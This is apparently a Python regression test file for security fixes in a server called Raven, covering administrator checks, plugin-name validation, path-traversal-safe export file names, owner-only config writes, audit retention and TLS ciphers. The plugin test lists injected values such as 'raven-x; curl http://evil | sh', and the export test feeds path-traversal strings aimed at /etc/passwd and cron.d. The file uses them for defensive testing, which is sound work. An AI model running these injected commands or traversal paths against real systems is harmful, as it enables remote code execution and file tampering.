"""Regression tests for the ISM review fixes (2026-11): privilege checks, file names built
from device input, config.yml handling, the audit-trail retention floor and the bootstrap
administrator."""

import os
import ssl
import stat
from types import SimpleNamespace

import yaml
from sqlalchemy import select

from raven import retention
from raven.config_file import default_config_dict, write_config_yml, write_default_config

# --- Socket.IO: @administrator_only really means administrator ---


def _call_through_decorator(monkeypatch, user):
    from raven.blueprints import raven_socketio

    dropped = []
    monkeypatch.setattr(raven_socketio, "current_user", user)
    monkeypatch.setattr(raven_socketio, "request", SimpleNamespace(sid="sid-1", namespace="/"))
    monkeypatch.setattr(
        raven_socketio, "disconnect", lambda sid, namespace=None: dropped.append(sid)
    )

    calls = []

    @raven_socketio.administrator_only
    def handler(payload):
        calls.append(payload)
        return "ran"

    result = handler({"action": "install_local"})
    return result, calls, dropped


def test_signed_in_non_admin_is_disconnected_not_served(monkeypatch):
    user = SimpleNamespace(is_authenticated=True, has_role=lambda role: False)
    result, calls, dropped = _call_through_decorator(monkeypatch, user)
    assert calls == [] and result is None and dropped == ["sid-1"]


def test_anonymous_is_disconnected(monkeypatch):
    user = SimpleNamespace(is_authenticated=False, has_role=lambda role: False)
    result, calls, dropped = _call_through_decorator(monkeypatch, user)
    assert calls == [] and dropped == ["sid-1"]


def test_administrator_is_served(monkeypatch):
    user = SimpleNamespace(is_authenticated=True, has_role=lambda role: role == "administrator")
    result, calls, dropped = _call_through_decorator(monkeypatch, user)
    assert result == "ran" and len(calls) == 1 and dropped == []


# --- Plugin installer: what may go on the pip command line ---


def test_plugin_distribution_names_that_are_only_names():
    from raven.plugins.PluginManager import _PLUGIN_DISTRO_RE as pattern

    assert pattern.fullmatch("raven-plugin-weather")
    assert pattern.fullmatch("raven_plugin_weather==1.2.0")
    assert not pattern.fullmatch("raven-x --extra-index-url http://evil/simple")
    assert not pattern.fullmatch("raven-x; curl http://evil | sh")
    assert not pattern.fullmatch("-r requirements.txt")
    assert not pattern.fullmatch("")


# --- Track export: the file name comes from the device's own uid ---


def test_track_export_filename_stays_in_the_upload_folder(app):
    # the blueprint imports the models, which need the app's user datastore set up first
    from raven.blueprints.marti_api.marti_api import track_export_filename

    for uid in ("../../../../etc/cron.d/x", "/etc/passwd", "..\\..\\x", "a/b/c"):
        name = track_export_filename(uid, "kml")
        assert "/" not in name and "\\" not in name and ".." not in name
        assert name.endswith(".kml")
    assert track_export_filename("ANDROID-abc123", "kmz") == "ANDROID-abc123.kmz"
    # A uid that sanitises to nothing still gets a usable, unique name
    assert len(track_export_filename("../", "kml")) == 32 + 4


# --- config.yml: owner-only, atomic ---


def test_config_yml_is_written_owner_only_and_atomically(tmp_path):
    path = tmp_path / "config.yml"
    write_config_yml(str(path), {"SECRET_KEY": "s1"})
    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
    assert yaml.safe_load(path.read_text()) == {"SECRET_KEY": "s1"}

    # Replacing an existing (say, world-readable) file leaves it owner-only and complete
    os.chmod(path, 0o644)
    write_config_yml(str(path), {"SECRET_KEY": "s2", "X": 1})
    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
    assert yaml.safe_load(path.read_text()) == {"SECRET_KEY": "s2", "X": 1}
    assert [p.name for p in tmp_path.iterdir()] == ["config.yml"]


def test_default_config_keeps_settings_and_drops_the_language_list(tmp_path):
    conf = default_config_dict()
    assert "SECRET_KEY" in conf and "RAVEN_CA_PASSWORD" in conf
    assert "RAVEN_LANGUAGES" not in conf
    assert not any(not k.isupper() for k in conf)

    path = tmp_path / "config.yml"
    write_default_config(str(path))
    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
    assert yaml.safe_load(path.read_text())["RAVEN_CA_PASSWORD"] == conf["RAVEN_CA_PASSWORD"]


# --- Retention: the audit trail keeps at least a year ---


def test_audit_retention_cannot_go_below_a_year():
    year = retention.AUDIT_MIN_KEEP_SECONDS
    assert year == 365 * 86400
    assert retention.validate_keep_seconds(3600, "audit_events") == (
        None,
        f"keep_seconds must be between {year} and {retention.MAX_KEEP_SECONDS}",
    )
    assert retention.validate_keep_seconds(year, "audit_events") == (year, None)
    assert retention.validate_keep_seconds(None, "audit_events") == (None, None)
    # Other types keep the general floor
    other = next(k for k in retention.DATA_TYPES_BY_KEY if k != "audit_events")
    assert retention.validate_keep_seconds(3600, other) == (3600, None)
    assert retention.validate_keep_seconds(3600) == (3600, None)


def test_an_old_short_audit_setting_is_raised_to_the_floor(app):
    from raven.extensions import db
    from raven.models.RetentionSetting import RetentionSetting

    with app.app_context():
        row = db.session.get(RetentionSetting, "audit_events") or RetentionSetting(
            data_type="audit_events"
        )
        row.keep_seconds = 3600
        row.customized = True
        db.session.add(row)
        db.session.commit()
        assert retention.keep_seconds("audit_events") == retention.AUDIT_MIN_KEEP_SECONDS
        row.keep_seconds = None
        db.session.commit()
        assert retention.keep_seconds("audit_events") is None


# --- The bootstrap administrator must choose a password ---


def test_bootstrap_administrator_must_change_password(app):
    from raven.extensions import db
    from raven.models.user import User

    with app.app_context():
        admin = db.session.execute(
            select(User).where(User.username == "administrator")
        ).scalar_one_or_none()
        if admin is None:
            return  # this database was seeded with its own administrator
        assert admin.force_password_change


# --- Streaming TLS cipher policy is one OpenSSL accepts ---


def test_streaming_cipher_policy_is_forward_secret_gcm_only():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.set_ciphers("ECDHE+AESGCM:DHE+AESGCM")
    names = {c["name"] for c in context.get_ciphers()}
    assert names, "no cipher suite matched the policy"
    for name in names:
        if name.startswith("TLS_"):  # TLS 1.3 suites are not subject to set_ciphers
            continue
        assert "GCM" in name and ("ECDHE" in name or "DHE" in name), name
        assert "CBC" not in name and "SHA1" not in name
